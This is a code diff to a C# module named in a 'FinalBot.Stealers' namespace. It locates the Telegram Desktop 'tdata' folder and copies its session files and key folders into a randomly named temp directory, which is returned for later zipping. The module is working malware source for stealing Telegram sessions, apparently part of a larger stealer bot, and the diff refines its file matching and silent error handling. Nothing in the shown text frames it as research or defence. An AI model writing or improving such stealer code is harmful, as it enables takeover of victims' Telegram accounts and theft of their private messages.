@@ -2,7 +2,6 @@ using System;
 using System.IO;
 using System.Collections.Generic;
 using System.Linq;
-using System.Threading.Tasks;
 
 namespace FinalBot.Stealers
 {
@@ -10,62 +9,61 @@ namespace FinalBot.Stealers
     {
         private readonly string _appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
 
-        public async Task<string> Run(string outputDir)
+        public string Run()
         {
-            string tdataPath = Path.Combine(_appData, "Telegram Desktop", "tdata");
-            if (!Directory.Exists(tdataPath)) return "❌ Telegram Desktop not found.";
-
-            string destPath = Path.Combine(outputDir, "Telegram_Session");
-            Directory.CreateDirectory(destPath);
-
-            try 
+            try
             {
+                string tdataPath = Path.Combine(_appData, "Telegram Desktop", "tdata");
+                if (!Directory.Exists(tdataPath)) return "❌ Telegram Desktop not found.";
+
+                string sessionDir = Path.Combine(Path.GetTempPath(), "TG_" + Guid.NewGuid().ToString().Substring(0, 8));
+                Directory.CreateDirectory(sessionDir);
+
+                // Core session files patterns
+                string[] includePatterns = { "D877*", "map*", "key_data*", "settings*" };
+                
                 int count = 0;
-                // Session files are usually key_datas, map*, and folders with 16-char hex names
-                var files = Directory.GetFiles(tdataPath, "*", SearchOption.TopDirectoryOnly);
-                foreach (var file in files)
+                foreach (var pattern in includePatterns)
                 {
-                    string name = Path.GetFileName(file);
-                    if (name.Length == 16 || name == "key_datas" || name.StartsWith("map"))
+                    foreach (var file in Directory.GetFiles(tdataPath, pattern))
                     {
-                        if (new FileInfo(file).Length < 5 * 1024 * 1024)
+                        try
                         {
-                            File.Copy(file, Path.Combine(destPath, name), true);
+                            string dest = Path.Combine(sessionDir, Path.GetFileName(file));
+                            File.Copy(file, dest, true);
                             count++;
                         }
+                        catch { }
                     }
                 }
 
-                // D877F783D5D3EF8C (example folder name)
-                var dirs = Directory.GetDirectories(tdataPath, "*", SearchOption.TopDirectoryOnly);
-                foreach (var dir in dirs)
+                // Also copy subfolders that look like sessions (e.g. D877...)
+                foreach (var dir in Directory.GetDirectories(tdataPath))
                 {
-                    string name = Path.GetFileName(dir);
-                    if (name.Length == 16 && !name.Equals("user_data", StringComparison.OrdinalIgnoreCase))
+                    string dirName = Path.GetFileName(dir);
+                    if (dirName.Length > 15 || dirName.StartsWith("D877"))
                     {
-                        CopyDirectory(dir, Path.Combine(destPath, name));
-                        count++;
+                        try
+                        {
+                            string destDir = Path.Combine(sessionDir, dirName);
+                            Directory.CreateDirectory(destDir);
+                            foreach (var file in Directory.GetFiles(dir))
+                            {
+                                File.Copy(file, Path.Combine(destDir, Path.GetFileName(file)), true);
+                            }
+                            count++;
+                        }
+                        catch { }
                     }
                 }
 
-                return $"✅ Telegram session captured ({count} items).";
+                if (count == 0) return "❌ No Telegram sessions found.";
+
+                return sessionDir; // Return path to the collected session for zipping
             }
             catch (Exception ex)
             {
-                return $"❌ Error capturing Telegram: {ex.Message}";
-            }
-        }
-
-        private void CopyDirectory(string sourceDir, string destDir)
-        {
-            Directory.CreateDirectory(destDir);
-            foreach (var file in Directory.GetFiles(sourceDir))
-            {
-                File.Copy(file, Path.Combine(destDir, Path.GetFileName(file)), true);
-            }
-            foreach (var subDir in Directory.GetDirectories(sourceDir))
-            {
-                CopyDirectory(subDir, Path.Combine(destDir, Path.GetFileName(subDir)));
+                return $"❌ Telegram error: {ex.Message}";
             }
         }
     }
